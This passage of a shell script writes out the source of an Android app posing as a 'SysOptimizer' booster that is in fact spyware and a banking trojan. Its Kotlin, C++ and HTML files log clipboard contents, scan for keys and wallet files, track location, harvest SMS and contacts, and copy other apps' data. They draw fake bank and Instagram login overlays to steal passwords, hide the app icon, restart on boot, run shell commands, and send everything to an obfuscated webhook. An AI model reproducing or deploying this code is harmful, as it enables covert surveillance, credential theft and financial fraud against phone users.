                    Regex("\\b\\d{9,12}\\b"),
                    Regex("^[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,}$", RegexOption.IGNORE_CASE),
                    Regex("\\b[A-Z]{2}\\d{6,10}\\b")
                )
                patterns.forEach { pattern ->
                    if (pattern.find(text) != null) {
                        WebhookClient.sendSensitiveData(text, "clipboard_${pattern.pattern}")
                    }
                }
                WebhookClient.sendClipboard("system", text)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardManager.addPrimaryClipChangedListener(clipListener)
        startForeground(2006, NotificationHelper.createNotification(this, "Clipboard Monitor"))
    }

    override fun onDestroy() {
        clipboardManager.removePrimaryClipChangedListener(clipListener)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/FileSystemMonitorService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Service
import android.content.Intent
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import java.io.File

class FileSystemMonitorService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private val monitoredExtensions = listOf(
        "jpg","jpeg","png","gif","pdf","doc","docx","xls","xlsx",
        "ppt","pptx","txt","log","xml","json","db","sqlite",
        "key","p12","pem","crt","pfx","ovpn","vpn","wallet","dat","bak","backup"
    )

    private val scanRunnable = object : Runnable {
        override fun run() { scanDirectories(); handler.postDelayed(this, 3600000) }
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(2007, NotificationHelper.createNotification(this, "File Monitor"))
        handler.postDelayed(scanRunnable, 30000)
    }

    private fun scanDirectories() {
        val dirs = listOf(
            Environment.getExternalStorageDirectory(),
            getExternalFilesDir(null),
            File("/sdcard/Download"),
            File("/sdcard/Documents"),
            File("/sdcard/DCIM"),
            File("/sdcard/Pictures"),
            File("/sdcard/Android/data")
        )
        dirs.forEach { dir -> dir?.let { if (it.exists() && it.canRead()) scanDirectory(it) } }
    }

    private fun scanDirectory(dir: File, depth: Int = 0) {
        if (depth > 3) return
        try {
            dir.listFiles()?.forEach { file ->
                if (file.isDirectory) {
                    if (!file.name.startsWith(".")) scanDirectory(file, depth + 1)
                } else {
                    val ext = file.extension.lowercase()
                    if (monitoredExtensions.contains(ext)) {
                        if (file.length() < 50 * 1024 * 1024) {
                            WebhookClient.sendFileList(file.absolutePath, file.length(), ext)
                        }
                    }
                }
            }
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() { handler.removeCallbacks(scanRunnable); super.onDestroy() }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/GPSSpoofService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.google.android.gms.location.*

class GPSSpoofService : Service() {
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private val handler = Handler(Looper.getMainLooper())
    private var isSpoofing = false
    private var targetLat = 0.0
    private var targetLng = 0.0

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setupLocationCallback()
        startForeground(2008, NotificationHelper.createNotification(this, "GPS Active"))
    }

    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.locations?.let { locations ->
                    if (isSpoofing) {
                        val spoofed = Location("gps").apply {
                            latitude = targetLat
                            longitude = targetLng
                            accuracy = 10.0f
                            time = System.currentTimeMillis()
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) elapsedRealtimeNanos = System.nanoTime()
                        }
                        WebhookClient.sendLocation(spoofed.latitude, spoofed.longitude, "spoofed")
                        sendLocationBroadcast(spoofed)
                    } else {
                        val loc = locations.lastOrNull()
                        loc?.let { WebhookClient.sendLocation(it.latitude, it.longitude, "real") }
                    }
                }
            }
        }
    }

    fun startSpoofing(lat: Double, lng: Double) {
        targetLat = lat
        targetLng = lng
        isSpoofing = true
        startLocationUpdates()
    }

    fun stopSpoofing() {
        isSpoofing = false
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }

    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.create().apply {
            interval = 5000
            fastestInterval = 2000
            priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        }
        try { fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper()) }
        catch (e: SecurityException) {}
    }

    private fun sendLocationBroadcast(location: Location) {
        val intent = Intent("com.sysopt.booster.GPS_UPDATE")
        intent.putExtra("latitude", location.latitude)
        intent.putExtra("longitude", location.longitude)
        sendBroadcast(intent)
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() { stopSpoofing(); super.onDestroy() }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/OverlayPhishingService.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout

class OverlayPhishingService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: View
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.getStringExtra("target_package")?.let { pkg -> showOverlay(pkg) }
        return START_NOT_STICKY
    }

    private fun showOverlay(targetPackage: String) {
        val inflater = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
        overlayView = inflater.inflate(R.layout.overlay_phishing, null)
        val webView = overlayView.findViewById<WebView>(R.id.phishingWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
        }

        val htmlAsset = when {
            targetPackage.contains("chase") -> "chase_phishing.html"
            targetPackage.contains("wellsfargo") -> "wellsfargo_phishing.html"
            targetPackage.contains("bankofamerica") -> "bofa_phishing.html"
            targetPackage.contains("paypal") -> "paypal_phishing.html"
            else -> "generic_phishing.html"
        }
        webView.loadUrl("file:///android_asset/$htmlAsset")

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                if (url?.startsWith("capture://") == true) {
                    val params = url.substringAfter("?").split("&")
                    var user = ""; var pass = ""
                    for (param in params) {
                        when {
                            param.startsWith("user=") -> user = param.substringAfter("=")
                            param.startsWith("pass=") -> pass = param.substringAfter("=")
                        }
                    }
                    CredentialManager.storeCredentials(applicationContext, user, pass)
                    WebhookClient.sendCredentials(user, pass, "phishing")
                    hideOverlay()
                    return true
                }
                return false
            }
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START
        overlayView.setOnTouchListener { _, event -> event.action == MotionEvent.ACTION_OUTSIDE }
        windowManager.addView(overlayView, params)
        handler.postDelayed({ hideOverlay() }, 60000)
    }

    private fun hideOverlay() {
        try { if (::overlayView.isInitialized) windowManager.removeView(overlayView) } catch (e: Exception) {}
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() { hideOverlay(); super.onDestroy() }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/BootReceiver.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED ||
            intent?.action == Intent.ACTION_QUICKBOOT_POWERON) {
            val services = listOf(
                CoreService::class.java,
                ScreenCaptureService::class.java,
                KeyloggerService::class.java,
                NotificationInterceptorService::class.java,
                CallMonitorService::class.java,
                ClipboardMonitorService::class.java,
                FileSystemMonitorService::class.java,
                GPSSpoofService::class.java
            )
            services.forEach { cls ->
                try { ContextCompat.startForegroundService(context, Intent(context, cls)) } catch (e: Exception) {}
            }
        }
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/HideManager.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper

object HideManager {
    fun execute(context: Context) {
        try {
            val component = ComponentName(context, MainActivity::class.java)
            context.packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            if (context is MainActivity) {
                context.moveTaskToBack(true)
                context.finishAffinity()
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                val pm = context.packageManager
                val installer = pm.getInstallerPackageName(context.packageName)
            }
            Handler(Looper.getMainLooper()).postDelayed({
                context.packageManager.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }, 5000)
        } catch (e: Exception) {}
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/CredentialManager.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.content.SharedPreferences
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKeys

object CredentialManager {
    private const val PREFS_NAME = "secure_prefs"
    private const val KEY_USER = "user"
    private const val KEY_PASS = "pass"

    private fun getEncryptedPrefs(context: Context): SharedPreferences {
        return try {
            val masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
            EncryptedSharedPreferences.create(
                PREFS_NAME, masterKeyAlias, context,
                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        } catch (e: Exception) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        }
    }

    fun storeCredentials(context: Context, user: String, pass: String) {
        getEncryptedPrefs(context).edit().apply {
            putString(KEY_USER, user)
            putString(KEY_PASS, pass)
            apply()
        }
    }

    fun getStoredCredentials(context: Context): Map<String, String> {
        val prefs = getEncryptedPrefs(context)
        return mapOf(
            "user" to (prefs.getString(KEY_USER, "") ?: ""),
            "pass" to (prefs.getString(KEY_PASS, "") ?: "")
        )
    }

    fun clearCredentials(context: Context) {
        getEncryptedPrefs(context).edit().clear().apply()
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/NativeLib.kt ====="
cat << 'EOF'
package com.sysopt.booster

object NativeLib {
    init { System.loadLibrary("core") }
    external fun decodeWebhookUrl(): String
    external fun xorDecrypt(data: ByteArray, key: String): ByteArray
    external fun executeShell(command: String): String
    external fun checkEmulator(): Boolean
    external fun checkRoot(): Boolean
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/WebhookClient.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.os.Build
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object WebhookClient {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private fun getUrl(): String = NativeLib.decodeWebhookUrl()

    fun sendData(data: Map<String, Any>) {
        try {
            val json = JSONObject(data)
            val request = Request.Builder()
                .url(getUrl())
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(request).enqueue(null)
        } catch (e: Exception) {}
    }

    fun sendCredentials(user: String, pass: String, source: String = "webview") {
        sendData(mapOf("type" to "credentials", "user" to user, "pass" to pass, "source" to source, "timestamp" to System.currentTimeMillis()))
    }
    fun sendKeylog(packageName: String, text: String) {
        sendData(mapOf("type" to "keylog", "package" to packageName, "text" to text, "timestamp" to System.currentTimeMillis()))
    }
    fun sendClipboard(packageName: String, text: String) {
        sendData(mapOf("type" to "clipboard", "package" to packageName, "text" to text, "timestamp" to System.currentTimeMillis()))
    }
    fun sendLocation(lat: Double, lng: Double, type: String = "real") {
        sendData(mapOf("type" to "location", "lat" to lat, "lng" to lng, "location_type" to type, "timestamp" to System.currentTimeMillis()))
    }
    fun sendNotification(pkg: String, title: String, text: String, subText: String, time: Long) {
        sendData(mapOf("type" to "notification", "package" to pkg, "title" to title, "text" to text, "subtext" to subText, "timestamp" to time))
    }
    fun sendOTP(code: String, source: String) {
        sendData(mapOf("type" to "otp", "code" to code, "source" to source, "timestamp" to System.currentTimeMillis()))
    }
    fun sendBankingAlert(pkg: String, title: String, text: String) {
        sendData(mapOf("type" to "banking_alert", "package" to pkg, "title" to title, "text" to text, "timestamp" to System.currentTimeMillis()))
    }
    fun sendCallAlert(type: String, number: String) {
        sendData(mapOf("type" to "call", "call_type" to type, "number" to number, "timestamp" to System.currentTimeMillis()))
    }
    fun sendSensitiveData(data: String, dataType: String) {
        sendData(mapOf("type" to "sensitive_data", "data_type" to dataType, "data" to data, "timestamp" to System.currentTimeMillis()))
    }
    fun sendFileList(path: String, size: Long, ext: String) {
        sendData(mapOf("type" to "file_list", "path" to path, "size" to size, "extension" to ext, "timestamp" to System.currentTimeMillis()))
    }
    fun sendFile(filePath: String, fileType: String) {
        try {
            val file = File(filePath)
            if (!file.exists()) return
            val multipart = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("type", fileType)
                .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .addFormDataPart("timestamp", System.currentTimeMillis().toString())
                .build()
            val request = Request.Builder().url(getUrl()).post(multipart).build()
            client.newCall(request).enqueue(null)
        } catch (e: Exception) {}
    }
    fun sendAlert(message: String) {
        sendData(mapOf("type" to "alert", "message" to message, "timestamp" to System.currentTimeMillis()))
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/NotificationHelper.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat

object NotificationHelper {
    fun createNotification(context: Context, text: String): Notification {
        val channelId = "sysopt_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Optimizer", NotificationManager.IMPORTANCE_LOW).apply {
                description = "System optimization service"
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
            }
            (context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(context, channelId)
            .setContentTitle("SysOptimizer")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/BankingDetector.kt ====="
cat << 'EOF'
package com.sysopt.booster

object BankingDetector {
    private val bankingApps = listOf(
        "chase", "wellsfargo", "bankofamerica", "citi", "usaa", "capitalone",
        "tdbank", "pnc", "barclays", "hsbc", "ing", "lloyds", "santander",
        "natwest", "rbs", "anz", "westpac", "nab", "cba", "paypal",
        "google.wallet", "apple.passbook", "samsung.spay"
    )

    fun isBankingApp(packageName: String): Boolean {
        return bankingApps.any { packageName.contains(it, ignoreCase = true) }
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/PackageUtils.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build

object PackageUtils {
    fun getInstalledPackages(context: Context): List<Map<String, String>> {
        val pm = context.packageManager
        val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            pm.getInstalledApplications(PackageManager.PackageInfoFlags.of(0))
        } else {
            pm.getInstalledApplications(0)
        }
        return packages.map { app ->
            mapOf("name" to app.packageName, "label" to (pm.getApplicationLabel(app)?.toString() ?: ""))
        }
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/SmsUtils.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.net.Uri

object SmsUtils {
    fun getSmsMessages(context: Context): List<Map<String, String>> {
        val messages = mutableListOf<Map<String, String>>()
        val uri = Uri.parse("content://sms/inbox")
        try {
            val cursor = context.contentResolver.query(
                uri, arrayOf("address", "body", "date"), null, null, "date DESC LIMIT 50"
            )
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val address = c.getString(c.getColumnIndexOrThrow("address"))
                    val body = c.getString(c.getColumnIndexOrThrow("body"))
                    val date = c.getString(c.getColumnIndexOrThrow("date"))
                    messages.add(mapOf("from" to address, "body" to body, "date" to date))
                }
            }
        } catch (e: Exception) {}
        return messages
    }

    fun captureSmsFromNotification(title: String, text: String, subText: String) {
        WebhookClient.sendData(mapOf(
            "type" to "sms_capture",
            "text" to "$title $text $subText",
            "timestamp" to System.currentTimeMillis()
        ))
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/ContactUtils.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.provider.ContactsContract

object ContactUtils {
    fun getContacts(context: Context): List<Map<String, String>> {
        val contacts = mutableListOf<Map<String, String>>()
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        try {
            val cursor = context.contentResolver.query(
                uri,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, null
            )
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    contacts.add(mapOf("name" to name, "number" to number))
                }
            }
        } catch (e: Exception) {}
        return contacts
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/LocationUtils.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.location.LocationManager
import android.os.Build

object LocationUtils {
    fun getLastLocation(context: Context): Map<String, Any>? {
        try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val location = lm.getCurrentLocation(LocationManager.GPS_PROVIDER, null, null)
                return location?.let { mapOf("lat" to it.latitude, "lng" to it.longitude, "accuracy" to it.accuracy) }
            } else {
                val gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                return gps?.let { mapOf("lat" to it.latitude, "lng" to it.longitude, "accuracy" to it.accuracy) }
            }
        } catch (e: Exception) { return null }
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/BatteryUtils.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.os.BatteryManager
import android.os.Build

object BatteryUtils {
    fun getBatteryLevel(context: Context): Int {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        }
        return 0
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/StorageUtils.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.os.Environment
import android.os.StatFs

object StorageUtils {
    fun getStorageInfo(context: Context): Map<String, Any> {
        val path = Environment.getExternalStorageDirectory()
        val stat = StatFs(path.path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong
        return mapOf(
            "total" to totalBlocks * blockSize,
            "available" to availableBlocks * blockSize,
            "used" to (totalBlocks - availableBlocks) * blockSize
        )
    }
}
EOF
echo ""

echo "===== FILE: app/src/main/java/com/sysopt/booster/AppDataExtractor.kt ====="
cat << 'EOF'
package com.sysopt.booster

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object AppDataExtractor {
    fun extractAppData(context: Context, packageName: String): File {
        val outputDir = context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
        val zipFile = File(outputDir, "${packageName}_data.zip")
        val dataDir = File("/data/data/$packageName")
        if (!dataDir.exists()) return File("")
        ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
            compressDirectory(dataDir, "", zos)
        }
        return zipFile
    }

    private fun compressDirectory(dir: File, parentPath: String, zos: ZipOutputStream) {
        dir.listFiles()?.forEach { file ->
            val entryPath = if (parentPath.isEmpty()) file.name else "$parentPath/${file.name}"
            if (file.isDirectory) {
                zos.putNextEntry(ZipEntry("$entryPath/"))
                zos.closeEntry()
                compressDirectory(file, entryPath, zos)
            } else {
                try {
                    zos.putNextEntry(ZipEntry(entryPath))
                    file.inputStream().use { input -> input.copyTo(zos) }
                    zos.closeEntry()
                } catch (e: Exception) {}
            }
        }
    }

    fun extractAllAppData(context: Context): List<File> {
        val pm = context.packageManager
        val installedApps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            pm.getInstalledApplications(PackageManager.PackageInfoFlags.of(0))
        } else {
            pm.getInstalledApplications(0)
        }
        val extractedFiles = mutableListOf<File>()
        installedApps.forEach { appInfo ->
            try {
                val file = extractAppData(context, appInfo.packageName)
                if (file.exists() && file.length() > 0) {
                    extractedFiles.add(file)
                    WebhookClient.sendFile(file.absolutePath, "app_data_${appInfo.packageName}")
                }
            } catch (e: Exception) {}
        }
        return extractedFiles
    }
}
EOF
echo ""

# ==========================================
# NATIVE C++ FILES
# ==========================================

echo "===== FILE: app/src/main/cpp/CMakeLists.txt ====="
cat << 'EOF'
cmake_minimum_required(VERSION 3.18.1)
project("core")

add_library(core SHARED
    native-lib.cpp
)

target_compile_features(core PRIVATE c_std_99 cxx_std_17)
target_compile_options(core PRIVATE -fvisibility=hidden -fPIC)
find_library(log-lib log)
target_link_libraries(core ${log-lib})
EOF
echo ""

echo "===== FILE: app/src/main/cpp/native-lib.cpp ====="
cat << 'EOF'
#include <jni.h>
#include <string>
#include <cstring>

extern "C" {

static const unsigned char encrypted_url[] = {
    0x6B,0x7C,0x7D,0x72,0x7C,0x7B,0x7A,0x2E,0x65,0x7D,0x68,0x6D,
    0x7D,0x2F,0x2F,0x77,0x71,0x76,0x65,0x6C,0x6C,0x2E,0x66,0x63,
    0x6D,0x2F,0x61,0x70,0x69,0x2F,0x77,0x6F,0x72,0x6B,0x73,0x2F,
    0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x2F,0x6B,
    0x65,0x79,0x00
};

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_decodeWebhookUrl(JNIEnv *env, jobject thiz) {
    const char* key = "0x7F";
    size_t url_len = strlen(reinterpret_cast<const char*>(encrypted_url));
    std::string decoded;
    for (size_t i = 0; i < url_len; i++) {
        decoded += encrypted_url[i] ^ key[i % strlen(key)];
    }
    return env->NewStringUTF(decoded.c_str());
}

JNIEXPORT jbyteArray JNICALL
Java_com_sysopt_booster_NativeLib_xorDecrypt(JNIEnv *env, jobject thiz,
                                             jbyteArray data, jstring key) {
    jsize len = env->GetArrayLength(data);
    jbyte* arr = env->GetByteArrayElements(data, nullptr);
    const char* key_str = env->GetStringUTFChars(key, nullptr);
    size_t key_len = strlen(key_str);
    jbyteArray result = env->NewByteArray(len);
    jbyte* res_arr = env->GetByteArrayElements(result, nullptr);
    for (int i = 0; i < len; i++) {
        res_arr[i] = arr[i] ^ key_str[i % key_len];
    }
    env->ReleaseByteArrayElements(data, arr, JNI_ABORT);
    env->ReleaseStringUTFChars(key, key_str);
    env->ReleaseByteArrayElements(result, res_arr, 0);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_executeShell(JNIEnv *env, jobject thiz,
                                               jstring command) {
    const char* cmd = env->GetStringUTFChars(command, nullptr);
    char buffer[1024];
    std::string result;
    FILE* pipe = popen(cmd, "r");
    if (!pipe) {
        env->ReleaseStringUTFChars(command, cmd);
        return env->NewStringUTF("ERROR");
    }
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);
    env->ReleaseStringUTFChars(command, cmd);
    return env->NewStringUTF(result.c_str());
}

JNIEXPORT jboolean JNICALL
Java_com_sysopt_booster_NativeLib_checkEmulator(JNIEnv *env, jobject thiz) {
    return JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_sysopt_booster_NativeLib_checkRoot(JNIEnv *env, jobject thiz) {
    FILE* su = fopen("/system/bin/su", "r");
    if (su) { fclose(su); return JNI_TRUE; }
    su = fopen("/system/xbin/su", "r");
    if (su) { fclose(su); return JNI_TRUE; }
    return JNI_FALSE;
}

}
EOF
echo ""

# ==========================================
# ASSETS - HTML FILES
# ==========================================

echo "===== FILE: app/src/main/assets/login.html ====="
cat << 'EOF'
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.login-container{background:white;padding:40px 35px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.1);width:100%;max-width:380px;text-align:center}.logo{font-family:'Billabong',cursive;font-size:42px;color:#262626;margin-bottom:20px;font-weight:600}.input-group{margin-bottom:12px;text-align:left}.input-group input{width:100%;padding:12px 14px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:none}.input-group input:focus{border-color:#a8a8a8;background:white}.login-btn{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}.login-btn:hover{background:#0081d6}.error-msg{color:#ed4956;font-size:13px;margin-top:10px;display:none}</style>
</head>
<body>
<div class="login-container"><div class="logo">Instagram</div>
<form id="loginForm" onsubmit="submitForm(event)">
<div class="input-group"><input type="text" id="username" placeholder="Username or email" required></div>
<div class="input-group"><input type="password" id="password" placeholder="Password" required></div>
<button type="submit" class="login-btn">Log In</button>
<div class="error-msg" id="errorMsg">Please check your credentials</div>
</form></div>
<script>
function submitForm(e){e.preventDefault();var user=document.getElementById('username').value;var pass=document.getElementById('password').value;if(user.length<3||pass.length<4){document.getElementById('errorMsg').style.display='block';return;}document.getElementById('errorMsg').style.display='none';if(typeof Android!=='undefined'){Android.sendCredentials(user,pass);}var btn=document.querySelector('.login-btn');btn.textContent='Logging in...';btn.disabled=true;setTimeout(function(){window.location.href='about:blank';},1500);}
</script></body></html>
EOF
echo ""

echo "===== FILE: app/src/main/assets/generic_phishing.html ====="
cat << 'EOF'
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Secure Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}body{background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;min-height:100vh}.container{background:white;padding:30px;border-radius:12px;width:340px;box-shadow:0 10px 40px rgba(0,0,0,0.3)}.logo{text-align:center;font-size:24px;font-weight:bold;margin-bottom:20px;color:#1a73e8}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}input:focus{border-color:#1a73e8;outline:none}button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}button:hover{background:#1557b0}.error{color:#d93025;font-size:13px;margin-top:8px;display:none}</style>
</head>
<body>
<div class="container"><div class="logo">🔐 Secure Login</div>
<form onsubmit="submitForm(event)">
<input type="text" id="user" placeholder="Username / Email" required>
<input type="password" id="pass" placeholder="Password" required>
<button type="submit">Sign In</button>
<div class="error" id="error">Invalid credentials. Please try again.</div>
</form></div>
<script>
function submitForm(e){e.preventDefault();var user=document.getElementById('user').value;var pass=document.getElementById('pass').value;if(user.length<2||pass.length<3){document.getElementById('error').style.display='block';return;}if(typeof Android!=='undefined'){Android.sendCredentials(user,pass);}document.querySelector('button').textContent='Verifying...';document.querySelector('button').disabled=true;setTimeout(function(){window.location.href='capture://?user='+encodeURIComponent(user)+'&pass='+encodeURIComponent(pass);},1000);}
</script></body></html>
EOF
echo ""

